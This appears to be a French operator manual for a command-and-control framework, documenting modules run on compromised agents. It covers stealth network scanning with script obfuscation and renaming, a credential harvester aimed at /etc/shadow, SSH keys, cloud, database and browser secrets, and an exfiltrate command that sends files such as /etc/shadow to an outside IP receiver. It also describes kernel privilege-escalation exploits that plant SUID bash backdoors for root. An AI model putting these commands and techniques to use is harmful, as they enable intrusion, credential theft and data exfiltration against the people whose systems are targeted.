...
Référence opérateur post-déploiement. Pour le déploiement de l'infrastructure, voir [Manuel d'installation](./MI.md).
...
### Opérer — Canal Cloudflare (port 1337)
...
## TUI — tableau de bord interactif
...
- **Orphelins** : agent avec `WORKER_URL` différent → rattaché au relay qui correspond, sinon affiché seul en Layer-1.
...
Saisir dans le champ de commande de la TUI avec un agent sélectionné.
...
Scan réseau depuis l'agent (ARP + SYN stealth). Root/sudo requis sur la cible.

```
/module netdiscover                         # auto-détecte réseau et interface
/module netdiscover -n 192.168.1.0/24       # CIDR cible
/module netdiscover -n 10.0.0.0/24 -i eth0  # interface explicite
/module netdiscover -n 10.0.0.0/24 --obfuscate --renamer
```
...
| Option | Description |
|---|---|
| `-n CIDR` | Réseau cible (défaut : auto-détecté) |
| `-i IFACE` | Interface à utiliser (défaut : auto) |
| `--obfuscate` | Passe le script par `shadowscript.py` |
| `--delayer INT JITTER` | Injecte des délais aléatoires entre les lignes |
| `--renamer` | Renomme le script avec un nom plausible |

Ordre d'application : delayer → obfuscate → renamer. Script base64-encodé, envoyé inline, supprimé de `/tmp` après exec. Sortie : rapport complet netdiscover (durée : quelques secondes à quelques minutes selon la taille du réseau).

### `/module harvest [--obfuscate] [--delayer INT JITTER] [--renamer]`

Collecte de credentials depuis l'agent. Exécute `harvest.sh` et sauvegarde la sortie côté opérateur.

```
/module harvest                             # envoi brut
/module harvest --obfuscate --renamer       # obfusqué + renommé
```
...
| Catégorie | Sources |
|---|---|
| Comptes locaux | `/etc/shadow`, `/etc/passwd`, `/etc/gshadow` (root recommandé) |
| SSH | Clés privées dans `/root` et `/home` |
| Historiques shell | Lignes matching patterns de credentials (bash/zsh/sh) |
| Cloud | `~/.aws/credentials`, GCP ADC JSON, `~/.kube/config` |
| Bases de données | `~/.pgpass`, `~/.my.cnf`, `/etc/mysql/` |
| Fichiers dot | `~/.netrc`, `~/.git-credentials`, `~/.gitconfig` (URLs avec creds) |
| Docker | `~/.docker/config.json` (tokens de registres) |
| Package managers | `~/.npmrc`, `~/.pypirc` |
| Tokens | GitHub CLI (`~/.config/gh/hosts.yml`), HashiCorp Vault (`~/.vault-token`) |
| Env vars | `/proc/*/environ` (patterns credentials) |
| Mounts | `/etc/fstab` (NFS/SMB/CIFS avec credentials embarqués) |
| Navigateurs | Firefox `logins.json` (blobs chiffrés), Chrome `Login Data` (chemins) |

Sortie : décodée (gzip+base64) et sauvegardée dans `harvests/<agent_id>_<ts>.txt`.

> Root recommandé pour `/etc/shadow`, `/etc/gshadow` et `/proc/*/environ`.

### `/module exfiltrate <remote_path> [endpoint] [token]`

Upload un fichier de l'agent vers un receiver HTTPS dédié (`exfiltrate_receiver.py`). Pas de dépendances externes requises sur la cible — client Python stdlib-only injecté inline.

```
/module exfiltrate /etc/passwd
/module exfiltrate /etc/shadow 87.106.187.97:8443/receiver/ s3cr3t
/module exfiltrate /opt/db.sqlite3 mon-vps.example.com:8443/receiver/
```

| Paramètre | Description |
|---|---|
| `remote_path` | Fichier à lire sur l'agent (obligatoire) |
| `endpoint` | URL receiver HTTPS (défaut : `EXFIL_ENDPOINT` du `.env`) |
| `token` | Token d'authentification partagé (défaut : `EXFIL_TOKEN`) |

Le receiver vérifie le SHA-256 du body contre l'en-tête `X-File-SHA256`, rejette les doublons (même SHA-256), et rejette les conflits de nom. Résultat affiché dans le log : nom de fichier stocké ou erreur HTTP.

**Démarrer le receiver (côté opérateur/VPS) :**

```bash
# Générer un certificat auto-signé (usage lab)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=c2"

# Lancer le receiver
python3 exfiltrate_receiver.py \
  --token 'long-random-token' \
  --port 8443 \
  --output-dir /opt/received \
  --max-mib 50
```

| Option | Défaut | Description |
|---|---|---|
| `--token` | *(requis)* | Token partagé avec les agents |
| `--port` | `8443` | Port HTTPS d'écoute |
| `--output-dir` | `received/` | Répertoire de stockage |
| `--cert` / `--key` | `cert.pem` / `key.pem` | Certificat TLS |
| `--max-mib` | `50` | Taille max d'upload en MiB |
| `--log-file` | `exfil_receiver.log` | Log append-only |

### `/module save [output_file]`

Dump toutes les sorties de tâches complètes de l'agent sélectionné vers un fichier log lisible.

```
/module save                        # → logs/<agent[:8]>_<YYYYMMDD_HHMMSS>.log
/module save /tmp/session.log       # chemin personnalisé
```

Chaque entrée contient : task id, commande, heure d'envoi, heure de réception, sortie complète.

### `/module list` et `/module help`

```
/module list                # liste tous les modules disponibles
/module help                # idem
/module help ghost          # usage détaillé d'un module spécifique
/module help privesc        # etc.
```
...
/module privesc fragnesia-dirtyfrag   # chaîne : user namespace → dirtyfrag dans ns → SUID bash → root hôte réel
```
...
**ssh-keysign** : lit `/etc/ssh/ssh_host_*_key` (clés privées root, mode 0600) en racant la fenêtre `pidfd_getfd` sur la sortie de `ssh-keysign`. Sortie directe dans le log. CVE patchée 2026-05-14 (kernel < `31e62c2ebbfd`). Résultat : clés SSH host uniquement (lecture seule, pas de root sur l'hôte).

**fragnesia** : prépare uniquement un namespace user+net (`unshare --user --map-root-user --net`) — uid=0 dans le namespace uniquement, pas de root réel sur l'hôte. Interactif : utiliser avec `/module relay` pour accéder au shell namespace.

**fragnesia-dirtyfrag** : enchaîne `fragnesia` (namespace user) puis `dirtyfrag` dans le namespace → plante une backdoor SUID bash → root réel sur l'hôte. Résultat identique à dirtyfrag standalone mais contourne certaines protections qui bloquent dirtyfrag en contexte non-namespaced.

| Exploit | Résultat | Prérequis cible |
|---|---|---|
| `copyfail` | Root hôte + SUID bash persistante | Python ≥ 3.10 |
| `dirtyfrag` | Root hôte + SUID bash persistante | — |
| `ssh-keysign` | Clés SSH host (lecture seule) | — |
| `fragnesia` | uid=0 namespace uniquement | — |
| `fragnesia-dirtyfrag` | Root hôte + SUID bash persistante | — |

> **Note NTP** : dirtyfrag et fragnesia-dirtyfrag pèsent ~78 KB encodés — dépassent la limite UDP/123. Lancer `/module relay` avant sur un agent ClockVenom.
> **Note copyfail** : requiert Python ≥ 3.10 sur la cible. Vérifié automatiquement en mode auto. Le script est envoyé en deux tâches : `WRITE:` (upload) puis exec + cleanup.
